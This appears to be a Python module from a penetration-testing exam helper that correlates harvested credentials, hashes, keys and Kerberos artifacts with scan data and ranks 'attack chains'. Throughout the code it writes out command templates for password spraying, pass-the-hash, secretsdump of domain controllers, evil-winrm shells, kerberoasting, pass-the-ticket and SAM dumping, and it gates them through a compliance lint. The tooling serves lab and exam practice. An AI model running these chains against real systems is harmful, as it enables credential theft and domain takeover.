"""correlate.py - the loot CORRELATION / ATTACK-CHAINING engine.

Runs AFTER all analyzers + ingest. It joins what secrethound found (creds,
hashes, keys, GPP, kerberos artifacts) with the ingested evidence (nmap
services, BloodHound facts, validated creds, host inventory) and emits ranked,
EXAM-LEGAL next actions under category ATTACK CHAINS.

Compliance is enforced from ONE source of truth: every emitted command is linted
against analyzers.compliance (no second allowlist lives here). Spoofing/relay
steps are confined to lab_only chains, capped at MEDIUM, never a top action, and
always carry the [LAB-ONLY] tag.
"""
import re
from analyzers import compliance
from analyzers.ingest.evidence import Evidence

LAB = compliance.LAB_ONLY_TAG

# ── detail-prefix parsers (the entity extractors) ──
_RX = {
    "credpair": re.compile(r'USER=(\S+)\s+PASS=(\S+)'),
    "cracked": re.compile(r"CRACKED .*?=\s*'([^']+)'"),
    "default_nt": re.compile(r"NTLM \(DEFAULT = '([^']+)'\):\s*([a-f0-9]{32})", re.I),
    "default_generic": re.compile(r"\(DEFAULT = '([^']+)'\)"),
    "nt": re.compile(r'NTLM(?: hash)?(?: \(NT\))?:?\s*([a-f0-9]{32})', re.I),
    "notes_pass": re.compile(r'notes(?:\s*table)?:\s*(?:PASS=|\S+?:)([^\s(]+)'),
    "assigned": re.compile(r'^[^=:]{1,40}[:=]\s*["\']?([^"\'\s#;]{4,60})'),
}


class Chain:
    __slots__ = ("rule", "label", "summary", "crit", "conf", "ready", "prox",
                 "commands", "lab_only", "src", "line")

    def __init__(self, rule, label, summary, crit, conf, ready, prox,
                 commands, lab_only=False, src="?", line=None):
        self.rule, self.label, self.summary = rule, label, summary
        self.crit, self.conf, self.ready, self.prox = crit, conf, ready, prox
        self.commands, self.lab_only = commands, lab_only
        self.src, self.line = src, line

    @property
    def score(self):
        return round(self.crit * self.conf * self.prox * self.ready, 1)


class _Ents:
    def __init__(self):
        self.creds = {}        # (user_lc, pw) -> (user_display, source, line)
        self.users = set()
        self.nt = {}           # hash -> (user, source, line)
        self.defaults = []     # (label, source) plaintext default creds
        self.kerberoastable = set()
        self.asreproastable = set()
        self.has_tgs = self.has_asrep = self.has_shadow = False
        self.has_gpp = self.has_pkey = self.has_cert = self.has_ccache = False
        self.shadow_src = self.gpp_src = self.pkey_src = self.cert_src = None
        self.ccache_src = self.tgs_src = self.asrep_src = None
        self.sam_dirs = {}     # dir -> set(hive names)


def _add_cred(e, user, pw, src, line):
    pw = (pw or "").strip().strip("'\"")
    if not pw or len(pw) < 3:
        return
    e.creds[((user or "").lower(), pw)] = (user or "<user>", src, line)
    if user:
        e.users.add(user)


def _entities(report, store):
    e = _Ents()
    import os
    for f in report.findings:
        d, cat, src, ln = f["detail"], f["category"], f["file"], f["line"]
        if cat == "CRED PAIRS":
            m = _RX["credpair"].search(d)
            if m:
                _add_cred(e, m.group(1), m.group(2), src, ln)
            m = _RX["cracked"].search(d)
            if m:
                _add_cred(e, "", m.group(1), src, ln)
            mn = _RX["notes_pass"].search(d)
            if mn:
                _add_cred(e, "", mn.group(1), src, ln)
            md = _RX["default_nt"].search(d)
            if md:
                e.defaults.append((md.group(1), src)); _add_cred(e, "", md.group(1), src, ln)
        if cat == "PASSWORD HASHES":
            mdn = _RX["default_nt"].search(d)
            if mdn:
                e.defaults.append((mdn.group(1), src)); _add_cred(e, "", mdn.group(1), src, ln)
            elif "NTLM" in d:
                mh = _RX["nt"].search(d)
                if mh:
                    e.nt[mh.group(1).lower()] = (None, src, ln)
            if d.startswith(("sha512crypt", "md5crypt", "sha256crypt", "bcrypt", "yescrypt")):
                e.has_shadow = True; e.shadow_src = e.shadow_src or (src, ln)
            if d.startswith("Kerberoast TGS"):
                e.has_tgs = True; e.tgs_src = e.tgs_src or (src, ln)
            if d.startswith("AS-REP roast"):
                e.has_asrep = True; e.asrep_src = e.asrep_src or (src, ln)
        if "DEFAULT = '" in d and cat != "PASSWORD HASHES":
            mdg = _RX["default_generic"].search(d)
            if mdg:
                e.defaults.append((mdg.group(1), src)); _add_cred(e, "", mdg.group(1), src, ln)
        if cat == "GPP cpassword":
            e.has_gpp = True; e.gpp_src = e.gpp_src or (src, ln)
        if cat == "PRIVATE KEYS":
            e.has_pkey = True; e.pkey_src = e.pkey_src or (src, ln)
        if cat == "INTERESTING FILES":
            low = (src or "").lower()
            if low.endswith((".pfx", ".p12")):
                e.has_cert = True; e.cert_src = e.cert_src or (src, ln)
            if low.endswith((".kirbi", ".ccache")) or "krb5cc" in low:
                e.has_ccache = True; e.ccache_src = e.ccache_src or (src, ln)
            base = os.path.basename(low)
            if base in ("sam", "system", "security"):
                e.sam_dirs.setdefault(os.path.dirname(src), set()).add(base)
    # merge ingested evidence
    for ev in store.items:
        if ev.kind == "plaintext" and ev.plaintext:
            _add_cred(e, ev.user, ev.plaintext, ev.source, ev.line)
        elif ev.kind == "cred" and ev.cred:
            _add_cred(e, ev.user, ev.cred, ev.source, ev.line)
        elif ev.kind == "hash" and ev.hash:
            e.nt[ev.hash.lower()] = (ev.user, ev.source, ev.line)
        if ev.user:
            e.users.add(ev.user)
        if ev.fact == "kerberoastable":
            e.kerberoastable.add(ev.user)
        elif ev.fact == "asreproastable":
            e.asreproastable.add(ev.user)
    return e


def _userlist(e):
    return "users.txt" if len({u.lower() for u in e.users}) > 1 else None


def run(report, store, ui=None):
    import os
    e = _entities(report, store)

    def host(svc, fallback="<target>"):
        hs = store.hosts_with_service({svc})
        if not hs:
            return fallback
        dcs = [h for h in hs if any(x.fact == "dc" and x.host == h
                                    for x in store.by_kind("host"))]
        return (dcs or hs)[0]

    def dc(fallback="<DC-IP>"):
        for x in store.by_kind("host"):
            if x.fact == "dc":
                return x.host
        hs = store.hosts_with_service({"smb"}) or store.hosts_with_service({"kerberos"})
        return hs[0] if hs else fallback

    chains = []
    ul = _userlist(e)

    # consolidated spray-candidate plaintexts
    for (ulc, pw), (disp, src, ln) in e.creds.items():
        utoken = ul or f"'{disp}'"
        smb = host("smb", dc())
        chains.append(Chain("R1", "spray", f"reuse {disp}:{pw} across hosts",
            crit=8, conf=0.8, ready=1.5, prox=_prox(store, smb),
            commands=[f"netexec smb {smb} -u {utoken} -p '{pw}' --continue-on-success" +
                      ("" if utoken == "users.txt" else " -k"),
                      f"impacket-secretsdump '{disp}':'{pw}'@{smb} -just-dc   # if (Pwn3d!)"],
            src=src, line=ln))
        if store.hosts_with_service({"winrm"}):
            wh = host("winrm")
            chains.append(Chain("R3", "winrm shell", f"{disp} -> WinRM on {wh}",
                crit=7, conf=0.8, ready=1.5, prox=_prox(store, wh),
                commands=[f"evil-winrm -i {wh} -u '{disp}' -p '{pw}'"], src=src, line=ln))
        if store.hosts_with_service({"mssql"}):
            mh = host("mssql")
            chains.append(Chain("R4", "mssql", f"{disp} -> MSSQL on {mh}",
                crit=6, conf=0.7, ready=1.5, prox=_prox(store, mh),
                commands=[f"impacket-mssqlclient '{disp}':'{pw}'@{mh} -windows-auth"], src=src, line=ln))
        if store.hosts_with_service({"ssh"}):
            sh = host("ssh")
            chains.append(Chain("R5", "ssh", f"{disp} -> SSH on {sh}",
                crit=6, conf=0.6, ready=1.4, prox=_prox(store, sh),
                commands=[f"ssh '{disp}'@{sh}    # password: {pw}"], src=src, line=ln))

    # NT hash -> PtH
    for h, (huser, src, ln) in e.nt.items():
        u = huser or "<user>"
        smb = host("smb", dc())
        chains.append(Chain("R7", "pass-the-hash", f"PtH {u} -> {smb}",
            crit=10, conf=0.85, ready=1.5, prox=_prox(store, smb),
            commands=[f"netexec smb {smb} -u '{u}' -H {h}",
                      f"impacket-secretsdump -hashes :{h} <DOMAIN>/'{u}'@{smb} -just-dc   # if (Pwn3d!)"],
            src=src, line=ln))
        if store.hosts_with_service({"winrm"}):
            wh = host("winrm")
            chains.append(Chain("R8", "PtH winrm", f"PtH {u} -> WinRM {wh}",
                crit=8, conf=0.8, ready=1.5, prox=_prox(store, wh),
                commands=[f"evil-winrm -i {wh} -u '{u}' -H {h}"], src=src, line=ln))

    # default creds -> log in directly
    for label, src in e.defaults:
        chains.append(Chain("R24", "default cred", f"default password '{label}' in use",
            crit=8, conf=1.0, ready=1.5, prox=0.9,
            commands=[f"netexec smb {dc()} -u '<user>' -p '{label}'"], src=src))

    # kerberoast
    for u in e.kerberoastable:
        chains.append(Chain("R9", "kerberoast", f"kerberoastable: {u}",
            crit=6, conf=0.8, ready=0.7, prox=0.7,
            commands=[f"impacket-GetUserSPNs -request -dc-ip {dc()} <DOMAIN>/<user>:<pass>",
                      "hashcat -m 13100 tgs.txt rockyou.txt -r best64.rule"],
            src="bloodhound"))
    if e.has_tgs:
        s, l = e.tgs_src
        chains.append(Chain("R10", "crack TGS", "Kerberoast TGS hash present",
            crit=4, conf=0.8, ready=0.7, prox=0.6,
            commands=["hashcat -m 13100 tgs.txt rockyou.txt -r best64.rule"], src=s, line=l))
    # AS-REP
    for u in e.asreproastable:
        chains.append(Chain("R11", "AS-REP roast", f"AS-REP-able: {u}",
            crit=5, conf=0.8, ready=0.7, prox=0.7,
            commands=[f"impacket-GetNPUsers <DOMAIN>/ -usersfile {ul or 'users.txt'} -dc-ip {dc()} -no-pass",
                      "hashcat -m 18200 asrep.txt rockyou.txt"], src="bloodhound"))
    if e.has_asrep:
        s, l = e.asrep_src
        chains.append(Chain("R12", "crack AS-REP", "AS-REP hash present",
            crit=4, conf=0.8, ready=0.7, prox=0.6,
            commands=["hashcat -m 18200 asrep.txt rockyou.txt"], src=s, line=l))

    # GPP cpassword
    if e.has_gpp:
        s, l = e.gpp_src
        chains.append(Chain("R13", "gpp-decrypt", "GPP cpassword (public key -> instant)",
            crit=7, conf=1.0, ready=1.5, prox=0.85,
            commands=["gpp-decrypt '<cpassword-value>'",
                      f"netexec smb {dc()} -u '<user>' -p '<decrypted>' --local-auth --continue-on-success"],
            src=s, line=l))
    # private key
    if e.has_pkey:
        s, l = e.pkey_src
        sh = host("ssh")
        chains.append(Chain("R17", "ssh key", "private key recovered",
            crit=6, conf=0.7, ready=1.3, prox=_prox(store, sh),
            commands=[f"chmod 600 <keyfile>; ssh -i <keyfile> <user>@{sh}",
                      "if ENCRYPTED: ssh2john <keyfile> > k; hashcat -m 22921 k rockyou.txt"],
            src=s, line=l))
    # cert / pfx -> certipy -> PtH
    if e.has_cert:
        s, l = e.cert_src
        chains.append(Chain("R16", "AD CS cert", "PKCS#12 cert/key (certipy -> NT hash/TGT)",
            crit=8, conf=0.7, ready=1.0, prox=0.8,
            commands=[f"certipy auth -pfx <file.pfx> -dc-ip {dc()}",
                      "then PtH the recovered NT hash (see R7)"], src=s, line=l))
    # ccache / kirbi
    if e.has_ccache:
        s, l = e.ccache_src
        chains.append(Chain("R26", "pass-the-ticket", "Kerberos ticket present",
            crit=6, conf=0.8, ready=1.4, prox=0.8,
            commands=[f"export KRB5CCNAME=<ticket.ccache>; impacket-secretsdump -k -no-pass <DOMAIN>/<user>@{dc()}-FQDN"],
            src=s, line=l))
    # shadow
    if e.has_shadow:
        s, l = e.shadow_src
        chains.append(Chain("R21", "crack shadow", "Linux shadow hash present",
            crit=5, conf=0.8, ready=0.7, prox=0.6,
            commands=["unshadow passwd shadow > u; hashcat -m 1800 u rockyou.txt"], src=s, line=l))
    # SAM/SYSTEM/SECURITY triad in one dir -> local secretsdump (no network)
    for d, hives in e.sam_dirs.items():
        if {"sam", "system"} <= hives:
            chains.append(Chain("R3T", "dump SAM", "SAM+SYSTEM present -> offline dump",
                crit=7, conf=1.0, ready=1.5, prox=0.7,
                commands=["impacket-secretsdump -sam SAM -system SYSTEM" +
                          (" -security SECURITY" if "security" in hives else "") + " LOCAL"],
                src=os.path.join(d, "SAM")))

    # ── compliance gate: tag lab-only, drop anything non-compliant ──
    clean = []
    for c in chains:
        cmds = []
        ok = True
        for cmd in c.commands:
            if c.lab_only and LAB not in cmd:
                cmd = cmd + "  " + LAB
            legal, _ = compliance.lint_command(cmd, tagged=c.lab_only)
            if not legal:
                ok = False
                break
            cmds.append(cmd)
        if ok and cmds:
            c.commands = cmds
            clean.append(c)
    chains = clean

    chains.sort(key=lambda c: (-c.score, -c.ready, c.prox is None, len(c.commands)))

    for c in chains:
        sev = "CRITICAL" if c.score >= 6 else "HIGH" if c.score >= 2 else "MEDIUM"
        if c.lab_only:
            sev = "MEDIUM"
        report.add(sev, "ATTACK CHAINS", c.src, c.line,
                   f"[{c.rule}] {c.summary}  (score {c.score})",
                   "  ;  ".join(c.commands))
    return chains


def _prox(store, host):
    """proximity 0.3-1.0: DC endpoints score highest."""
    if not host or host.startswith("<"):
        return 0.5
    for x in store.by_kind("host"):
        if x.host == host and x.fact == "dc":
            return 1.0
    return 0.7
